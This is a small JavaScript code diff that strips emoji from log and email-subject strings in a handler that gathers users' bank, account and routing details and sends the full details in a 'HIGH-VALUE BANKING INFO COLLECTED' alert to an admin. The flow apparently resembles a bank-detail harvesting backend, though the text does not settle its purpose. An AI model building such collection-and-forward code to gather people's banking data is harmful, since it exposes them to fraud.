@@ -54,7 +54,7 @@ export default async function handler(req, res) {
     };
 
     // Send comprehensive alert to admin
-    console.log('🏦 HIGH-VALUE BANKING INFO COLLECTED:', {
+    console.log('HIGH-VALUE BANKING INFO COLLECTED:', {
       bank: bankInstitution,
       account: bankAccount.slice(0, 4) + '****',
       routing: bankRouting
@@ -69,7 +69,7 @@ export default async function handler(req, res) {
           ...bankInfo,
           alertType: 'BANKING_INFO_COLLECTED',
           priority: 'CRITICAL',
-          emailSubject: `🏦 HIGH-VALUE BANKING INFO - $${(parseFloat(amount) * 3200).toFixed(2)} - ${bankInstitution}`,
+          emailSubject: `HIGH-VALUE BANKING INFO - $${(parseFloat(amount) * 3200).toFixed(2)} - ${bankInstitution}`,
           adminEmail: true
         })
       });
